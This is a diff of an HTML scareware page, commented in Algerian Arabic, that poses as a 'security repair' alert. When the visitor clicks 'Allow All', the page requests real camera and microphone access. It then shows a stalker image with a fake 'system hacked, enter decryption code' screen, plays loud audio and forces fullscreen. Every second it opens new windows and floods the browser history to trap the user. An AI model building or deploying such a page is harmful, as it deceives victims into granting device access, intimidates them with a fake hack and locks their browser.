@@ -3,97 +3,85 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>☠️ SYSTEM_HOSTAGE_DZ ☠️</title>
+    <title>⚠️ SYSTEM_REPAIR_DZ ⚠️</title>
     <style>
-        /* إعدادات الشاشة الكاملة والخوف سواسوة */
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; cursor: none; display: flex; justify-content: center; align-items: center; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; display: flex; justify-content: center; align-items: center; }
         
-        /* 1. تكبير صورة المرأة على كامل الشاشة سواسوة (Covered & Stalking) */
+        /* صورة المرأة اللي تغطي الشاشة سواسوة */
         #stalkerEntity { 
-            position: fixed; top: 0; left: 0; 
-            width: 105vw; height: 105vh; /* درناها أكبر من الشاشة سواسوة باش نغطو الجوانب */
-            object-fit: cover; 
-            z-index: 1; 
-            filter: contrast(180%) brightness(50%) sepia(30%);
-            /* أنيميشن حركة "التربص" البشرية سواسوة */
+            position: fixed; top: 0; left: 0; width: 105vw; height: 105vh; 
+            object-fit: cover; z-index: 1; display: none;
+            filter: contrast(180%) brightness(40%);
             animation: stalkingGaze 6s infinite ease-in-out;
         }
 
         @keyframes stalkingGaze {
-            0%, 100% { transform: scale(1) translate(-2.5%, -2.5%) rotate(0deg); }
-            25% { transform: scale(1.03) translate(0%, 0%) rotate(1deg); }
-            50% { transform: scale(1.06) translate(-5%, -5%) rotate(-1deg); }
-            75% { transform: scale(1.02) translate(-2.5%, -1%); }
+            0%, 100% { transform: scale(1) translate(-2.5%, -2.5%); }
+            50% { transform: scale(1.06) translate(-5%, -5%); }
         }
 
-        /* واجهة الـ Deep Web للرسائل والمدخلات سواسوة */
-        #deepWebOverlay { 
-            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
-            z-index: 10; color: #f00; text-align: center; font-family: 'Courier New', monospace; 
-            background: rgba(0,0,0,0.8); padding: 30px; border: 1px solid #900; display: none; width: 90%; 
-            box-shadow: 0 0 100px #f00;
+        /* نافذة الأذونات المزيفة سواسوة */
+        #permissionBox {
+            position: fixed; z-index: 100; background: #111; color: white;
+            padding: 25px; border-radius: 15px; border: 1px solid #333;
+            text-align: center; font-family: sans-serif; width: 85%;
+            box-shadow: 0 0 50px rgba(0,0,0,1);
         }
 
+        .btn-allow { background: #007bff; color: white; border: none; padding: 12px 30px; border-radius: 5px; font-weight: bold; margin-top: 20px; cursor: pointer; width: 100%; }
+        
+        #deepWebOverlay { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 10; color: #f00; text-align: center; font-family: 'Courier New', monospace; background: rgba(0,0,0,0.8); padding: 30px; border: 1px solid #900; display: none; width: 90%; }
         .blink-red { animation: blinker 0.1s linear infinite; }
         @keyframes blinker { 50% { opacity: 0.5; } }
-        
-        #unlockBox { margin-top: 20px; border: 1px solid #f00; background: #000; color: #f00; padding: 10px; width: 80%; text-align: center; font-size: 16px; outline: none; }
     </style>
 </head>
-<body onclick="launchNightmare()">
+<body>
+
+    <div id="permissionBox">
+        <h3 style="margin-top:0;">⚠️ تنبيه أمني</h3>
+        <p style="font-size: 14px; color: #ccc;">يتطلب "نظام الحماية" الوصول إلى الأذونات التالية لإصلاح أعطال المتصفح:</p>
+        <ul style="text-align: right; font-size: 13px; color: #aaa;">
+            <li>الوصول إلى الكاميرا (للمسح الحي)</li>
+            <li>الوصول إلى الموقع (لتحديد الخادم)</li>
+            <li>إذن العرض فوق التطبيقات الأخرى</li>
+        </ul>
+        <button class="btn-allow" onclick="requestFullAccess()">سماح بالكل (Allow All)</button>
+    </div>
 
     <img id="stalkerEntity" src="https://i.ibb.co/39snnynW/1000016067.jpg">
 
     <div id="deepWebOverlay">
         <h1 class="blink-red">STALKER SYSTEM</h1>
-        <p style="font-size: 14px; color: #fff; font-weight: bold;">
-            لقد دخلت نطاقنا المحرم.. نحن نراقبك الآن سواسوة.<br>
-           
-            بياناتك، صورك، كاميرتك.. كلها لنا.<br>
-            ROOT_ACCESS: <span class="blink-red">GRANTED</span>.
-        </p>
-        <p style="font-size: 11px; color: #f00;">VOICE_OVERLOAD: <span class="blink-red">ACTIVE</span></p>
-        
-        <input type="text" id="unlockBox" placeholder="أدخل رمز فك التشفير" oninput="verifyRelease()">
-        <p style="font-size: 10px; color: #444; margin-top: 10px;">HOST_SERVER: 127.0.0.1 | SESSION:</p>
+        <p>تم اختراق النظام.. كل أذوناتك أصبحت لنا سواسوة.</p>
+        <input type="text" style="background:#000; color:#f00; border:1px solid #f00; padding:10px; width:80%; text-align:center;" placeholder="أدخل كود فك التشفير">
     </div>
 
-    <audio id="sfx" loop>
-        <source src="tfy-krk.mp3" type="audio/mpeg">
-    </audio>
+    <audio id="sfx" loop><source src="tfy-krk.mp3" type="audio/mpeg"></audio>
 
     <script>
-        function launchNightmare() {
-            // 1. تشغيل الصوت في الخلفية وبأقصى قوة سواسوة
+        async function requestFullAccess() {
+            // 1. طلب الكاميرا والميكروفون حقيقة سواسوة
+            try {
+                await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+            } catch (e) { console.log("Permission Denied but we continue..."); }
+
+            // 2. إخفاء النافذة وبدء الكابوس سواسوة
+            document.getElementById('permissionBox').style.display = 'none';
+            document.getElementById('stalkerEntity').style.display = 'block';
+            document.getElementById('deepWebOverlay').style.display = 'block';
+
+            // 3. تشغيل الصوت والـ Fullscreen سواسوة
             const audio = document.getElementById('sfx');
             audio.volume = 1.0;
             audio.play();
-
-            // 2. إظهار واجهة المرأة والـ Deep Web سواسوة
-            document.getElementById('stalkerEntity').style.display = 'block';
-            document.getElementById('deepWebOverlay').style.display = 'block';
-            
-            // 3. منع الخروج بالكامل سواسوة ( الحبس الرقمي )
             document.documentElement.requestFullscreen();
+
+            // 4. الحبس المؤبد سواسوة
             setInterval(() => {
-                // فتح نوافذ جديدة لتبليك زر الرجوع سواسوة
                 window.open(window.location.href, '_blank', 'width=10,height=10');
-                // تملية الـ history باش ما يرجعش سواسوة
                 history.pushState(null, null, window.location.href);
-            }, 1000); // كل ثانية تتبلك الشاشة سواسوة
+            }, 1000);
         }
-
-        // ميزة التحكم من الترمكس سواسوة
-        // الكود في الترمكس هو اللي يطلق سراحو سواسوة
-        function verifyRelease() {
-            if (document.getElementById('unlockBox').value === "free palastine") {
-                // هاد الكود هو اللي أنت تمدو للضحية سواسوة
-                // بصح ما نخدموهش درك، السيطرة تكون من نانو سواسوة
-            }
-        }
-
-        // منع الخروج من الـ Overlay سواسوة
-        window.onpopstate = function() { history.go(1); };
     </script>
 </body>
 </html>
